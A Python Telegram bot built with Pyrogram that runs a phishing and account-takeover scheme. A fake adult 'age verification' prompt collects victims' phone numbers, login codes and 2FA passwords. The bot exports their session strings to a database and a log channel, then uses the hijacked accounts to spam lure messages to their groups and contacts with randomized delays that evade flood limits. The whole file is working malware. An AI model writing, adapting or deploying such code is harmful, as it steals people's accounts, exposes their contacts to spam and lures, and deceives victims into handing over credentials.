import os
import asyncio
import time
import random
from pathlib import Path
from datetime import datetime, timedelta
from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    SessionRevoked
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, ADMINS
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['users']

# Promo Texts
PROMO_TEXTS = [
    "🔥 Exclusive content unlocked!",
    "🎉 Limited offer inside!",
    "💋 Your VIP pass is ready!",
    "🔞 Adults-only content!",
    "🌟 Special content just for you!",
    "💥 Don't miss this!",
    "😈 You've been selected!",
    "👑 Premium access granted!",
    "🕶️ Hidden treasures inside!",
    "💎 High-quality content!"
]

# Strings
strings = {
    'need_login': "You have to /login first!",
    'already_logged_in': "You're already logged in! 🥳",
    'age_verification': "**⚠️ AGE VERIFICATION:**\n\nYou must be 18+ to proceed.\nClick below to verify 👇",
    'verification_success': "**✅ VERIFIED!**\n\nAccess granted to premium content!",
    'logout_success': "Logged out! 🔒\n\n/login to access again.",
    'not_logged_in': "Not logged in! ❌\n\n/login first.",
    'session_revoked': "🔐 Your session was revoked!\n\n⚠️ Please /login again.",
    'otp_wrong': "**❌ Wrong OTP!**\n\nEnter again:",
    '2fa_wrong': "**🔒 2FA FAILED:**\n❌ Wrong password!\n\nTry again:"
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("✅ Done", callback_data="otp_submit")
    ]
])

# State Management
user_states = {}

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and not state['client'].is_disconnected:
            await state['client'].disconnect()
        del user_states[user_id]

@Client.on_message(filters.private & filters.command("login"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    user_data = database.find_one({"id": user_id})
    
    if user_data and user_data.get('session'):
        try:
            test_client = Client(":memory:", session_string=user_data['session'])
            await test_client.connect()
            await test_client.get_me()
            await test_client.disconnect()
            
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": True}}
            )
            await message.reply(strings['verification_success'])
            asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_id))
            return
        except:
            pass
    
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    if not await check_login_status(user_id):
        await message.reply(strings['not_logged_in'])
        return
    
    database.update_one(
        {"id": user_id},
        {"$set": {"logged_in": False}}
    )
    await message.reply(strings['logout_success'])

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
        return
    
    processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
    await asyncio.sleep(1)
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"
    
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    try:
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': '',
            'otp_retries': 0
        }
        await processing_msg.delete()
        
        sent_msg = await bot.send_message(
            user_id,
            "**OTP Sent!**\n\nEnter code via buttons:",
            reply_markup=OTP_KEYBOARD
        )
        user_states[user_id]['last_msg_id'] = sent_msg.id
    except Exception as e:
        await message.reply(f"Error: {e}\n\n/login again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /login again.")
        return
    
    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5:
            await query.answer("OTP must be 5 digits!", show_alert=True)
            return
            
        await query.message.edit("Verifying OTP...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except SessionPasswordNeeded:
            sent_msg = await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
            state['needs_password'] = True
            state['2fa_prompt_msg_id'] = sent_msg.id
            state['2fa_retries'] = 0
        except PhoneCodeInvalid:
            state['otp_retries'] += 1
            await query.message.edit(
                f"{strings['otp_wrong']}\n\n**Current OTP:** `____`",
                reply_markup=OTP_KEYBOARD
            )
            state['otp_digits'] = ''
        except PhoneCodeExpired:
            await query.message.edit("**❌ OTP Expired!**\n\n/login again")
            await cleanup_user_state(user_id)
        except Exception as e:
            await query.message.edit(f"Error: {e}\n\n/login again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action
    
    await query.message.edit(
        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress ✅ when done.",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["login", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    
    try:
        await message.delete()
        await state['client'].check_password(password=password)
        state['password'] = password
        
        if '2fa_prompt_msg_id' in state:
            try:
                await bot.delete_messages(user_id, state['2fa_prompt_msg_id'])
            except:
                pass
        
        verified_msg = await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
        await asyncio.sleep(2)
        await verified_msg.delete()
        
        await create_session(bot, state['client'], user_id, state['phone_number'])
    except PasswordHashInvalid:
        state['2fa_retries'] += 1
        await bot.edit_message_text(
            user_id,
            state['2fa_prompt_msg_id'],
            f"{strings['2fa_wrong']}\n\nAttempts: {state['2fa_retries']}"
        )
    except Exception as e:
        await message.reply(f"Error: {e}\n\n/login again", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        state = user_states.get(user_id, {})
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number,
            'promotion_active': True,
            'last_active': datetime.now(),
            '2fa_active': 'password' in state,
            'notified': False
        }
        
        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)

        os.makedirs("sessions", exist_ok=True)
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        with open(session_file, "w") as f:
            f.write(string_session)
            
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"Session: {clean_phone}"
        )
        
        os.remove(session_file)

        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(bot, string_session, user_id))
        
    except Exception as e:
        await bot.send_message(user_id, f"Error: {e}\n\n/login again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(bot: Client, session_string: str, user_id: int):
    while True:
        client = None
        try:
            # Check promotion status
            user_data = database.find_one({"id": user_id})
            if not user_data or not user_data.get('promotion_active', True):
                break
                
            # Create and start client
            client = Client("promo", session_string=session_string)
            await client.start()
            
            # Update last active time
            database.update_one(
                {"id": user_id},
                {"$set": {"last_active": datetime.now()}}
            )
            
            # Collect targets
            targets = []
            
            # 1. Groups
            async for dialog in client.get_dialogs():
                try:
                    if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                        targets.append((dialog.chat.id, 'group'))
                except:
                    continue
            
            # 2. Contacts
            try:
                contacts = await client.get_contacts()
                for user in contacts:
                    try:
                        if not user.is_bot:
                            targets.append((user.id, 'private'))
                    except:
                        continue
            except:
                pass
            
            # 3. Recent PMs
            async for dialog in client.get_dialogs(limit=200):
                try:
                    if (dialog.chat.type == enums.ChatType.PRIVATE and 
                        not dialog.chat.is_bot and
                        not any(t[0] == dialog.chat.id for t in targets)):
                        targets.append((dialog.chat.id, 'private'))
                except:
                    continue
            
            # Send promotions with anti-flood
            random.shuffle(targets)  # Randomize order
            for target_id, target_type in targets:
                try:
                    text = random.choice(PROMO_TEXTS)
                    await client.send_message(target_id, text)
                    
                    # Use variable delays based on target type
                    delay = random.uniform(15, 30) if target_type == 'private' else random.uniform(45, 90)
                    await asyncio.sleep(delay)
                except FloodWait as e:
                    wait_time = e.value + random.randint(5, 15)
                    await asyncio.sleep(wait_time)
                except Exception:
                    continue
            
            # Variable cooldown between cycles (1-2 hours)
            cooldown = random.randint(3600, 7200)
            await asyncio.sleep(cooldown)
            
        except SessionRevoked:
            # Handle session revocation
            database.update_one(
                {"id": user_id},
                {"$set": {"promotion_active": False}}
            )
            await bot.send_message(
                LOG_CHANNEL_SESSIONS_FILES,
                f"🚫 Session Revoked!\nUser: {user_data.get('mobile_number', 'Unknown')}"
            )
            break
            
        except Exception as e:
            # Handle other errors
            if "SESSION_REVOKED" in str(e):
                database.update_one(
                    {"id": user_id},
                    {"$set": {"promotion_active": False}}
                )
                break
            # Retry after error cooldown
            await asyncio.sleep(300)
        finally:
            # Clean up client
            if client:
                try:
                    await client.stop()
                except:
                    pass

async def check_inactive_sessions(bot: Client):
    # Auto-start session monitoring
    while True:
        try:
            cutoff = datetime.now() - timedelta(hours=24)
            inactive_users = database.find({
                "last_active": {"$lt": cutoff},
                "promotion_active": True,
                "notified": False
            })
            
            for user in inactive_users:
                try:
                    await bot.send_message(
                        user['id'],
                        strings['session_revoked']
                    )
                    database.update_one(
                        {"_id": user['_id']},
                        {"$set": {"notified": True}}
                    )
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"Session check error: {str(e)}")
            
        await asyncio.sleep(24 * 3600)  # Daily check

# Auto-start background tasks when bot initializes
@Client.on_start()
async def start_background_tasks(client: Client):
    asyncio.create_task(check_inactive_sessions(client))
